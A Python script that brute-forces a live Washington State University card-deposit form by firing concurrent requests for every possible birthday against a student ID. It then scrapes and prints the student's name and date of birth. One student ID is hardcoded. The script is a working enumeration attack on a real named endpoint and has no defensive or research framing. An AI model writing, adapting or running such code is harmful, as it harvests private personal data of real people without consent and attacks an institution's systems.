import asyncio

from copy import copy
import sys

import requests
import aiohttp
from bs4 import BeautifulSoup

from birthdays import EVERY_BIRTHDAY

ENDPOINT = "https://livingat.wsu.edu/cardinfo/deposit/default.aspx?mode=CC"


class Student:
    def __init__(self, wsu_id, name, birthday):
        self.wsu_id = wsu_id
        self.name = name
        self.birthday = birthday

    def __str__(self):
        return f"{self.wsu_id} -> {self.name} {self.birthday}"


def get_inputs():
    """
    # Get hidden inputs to create a valid POST request later
    """
    text = requests.get(ENDPOINT).text
    bs = BeautifulSoup(text, 'html.parser')

    view_state = bs.find(id="__VIEWSTATE").get('value')
    event_val = bs.find(id="__EVENTVALIDATION").get('value')  # Is this a CSRF?

    # Hidden fields
    params = {
        "__EVENTTARGET": "ctl00$mainContent$btnContinue",
        "__VIEWSTATE": view_state,
        "__EVENTVALIDATION": event_val,
    }

    return params


async def check_birthday(form_data, wsu_id, birthday):
    form_data.update({
        "ctl00$mainContent$txtWSUID": wsu_id,
        "ctl00$mainContent$DropDownListMonth": birthday.month,
        "ctl00$mainContent$DropDownListDay": birthday.day,
    })

    async with aiohttp.ClientSession() as session:
        async with session.post(ENDPOINT, data=form_data) as response:
            text = await response.text()

    if "Birthday is incorrect" in text:
        # Give up on this task
        await asyncio.sleep(float('inf'))
    else:
        # We hit the jackpot
        bs = BeautifulSoup(text, 'html.parser')
        name = bs.find(id="ctl00_mainContent_lblName").text.lstrip(" - ")

        student = Student(wsu_id, name, birthday)
        print(student)

        return


async def lookup_wsu_id(wsu_id):
    form_data = get_inputs()  # Get hidden fields from page with GET

    checks = [
        check_birthday(copy(form_data), wsu_id, birthday)
        for birthday in EVERY_BIRTHDAY
    ]
    await asyncio.wait(checks, return_when=asyncio.FIRST_COMPLETED)


def main():
    sys.argv.append('11525552')

    for wsu_id in sys.argv[1:]:
        print(f"Looking up {wsu_id}")
        asyncio.run(lookup_wsu_id(wsu_id))


if __name__ == '__main__':
    main()
